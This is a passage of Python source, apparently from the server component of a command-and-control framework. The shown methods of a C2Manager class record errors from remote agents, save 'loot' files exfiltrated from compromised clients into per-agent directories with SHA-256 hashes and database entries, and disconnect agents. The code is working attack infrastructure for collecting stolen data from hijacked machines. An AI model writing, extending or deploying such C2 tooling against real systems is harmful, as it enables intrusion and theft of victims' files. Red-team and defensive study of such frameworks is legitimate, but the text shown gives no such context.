            error = data['error']
            # Same for errors
            self.db.save_command(client_id, last_cmd or '<unknown>', error, False)
            self.bus.emit({"type": "console", "target": client_id, "text": f"ERROR: {error}", "kind": "RX"})


    def _handle_loot(self, client_id: str, download: dict):
        """Save downloaded file"""
        try:
            filename = download['filename']
            data = base64.b64decode(download['data'])

            # Create client loot directory
            client_dir = LOOT_DIR / client_id
            client_dir.mkdir(exist_ok=True)

            # Save file with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = client_dir / f"{timestamp}_{filename}"

            with open(filepath, 'wb') as f:
                f.write(data)

            # Calculate hash
            file_hash = hashlib.sha256(data).hexdigest()

            # Save to database
            self.db.save_loot({
                'agent_id': client_id,
                'filename': filename,
                'filepath': str(filepath),
                'size': len(data),
                'hash': file_hash
            })

            self._stats['total_loot'] += 1

            # Emit event
            self.bus.emit({
                "type": "log",
                "level": "info",
                "text": f"Loot saved from {client_id}: {filename} ({len(data)} bytes)"
            })

            self.logger.info(f"Loot saved: {filepath}")

        except Exception as e:
            self.logger.error(f"Failed to save loot: {e}")

    def _disconnect_client(self, client_id: str):
        """Disconnect and clean up client"""
        try:
            with self._lock:
                client = self._clients.get(client_id)
                if client:
                    # Signal loops to stop cleanly
                    client['info']['closing'] = True

                    # Cleanly close the socket
                    try:
                        client['sock'].shutdown(socket.SHUT_RDWR)
                    except Exception:
                        pass
                    try:
                        client['sock'].close()
                    except Exception:
                        pass

                    # retirer de la map
                    del self._clients[client_id]

            # maj DB
            self.db.save_agent({
                'id': client_id,
                'status': AgentStatus.OFFLINE.value,
                'last_seen': datetime.utcnow().isoformat()
            })

            # event log
            self.bus.emit({
                "type": "log",
                "level": "warning",
                "text": f"Client {client_id} disconnected"
            })
            self.logger.info(f"Client {client_id} disconnected")

        except Exception as e:
            self.logger.error(f"Error disconnecting client: {e}")



# ========== Global Instance ==========
c2_manager = C2Manager()



